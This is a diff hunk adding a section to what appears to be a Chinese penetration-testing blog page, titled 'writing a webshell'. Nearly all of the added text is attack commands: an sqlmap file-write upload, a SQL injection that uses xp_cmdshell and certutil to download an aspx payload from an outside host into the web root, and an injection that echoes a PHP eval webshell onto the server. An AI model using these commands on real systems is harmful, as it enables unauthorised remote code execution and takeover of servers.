@@ -104,6 +104,7 @@
 
 <p>验证：</p>
 <p><img src="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png" alt="图片.png"></p>
+<p><strong>3 写马</strong><br>sqlmap –random-agent –batch -r 1 –file-write 1.aspx –file-dest “xx\xx\aaa.aspx”<br>1;exec master..xp_cmdshell ‘certutil -urlcache -split -f <a href="http://x.x.x.x/aa.aspx" target="_blank" rel="noopener">http://x.x.x.x/aa.aspx</a> C:\phpstudy\www\aaa.aspx’;–<br>1;exec master..xp_cmdshell ‘echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\phpstudy\www\shell.php’;–</p>
 
       
     </div>
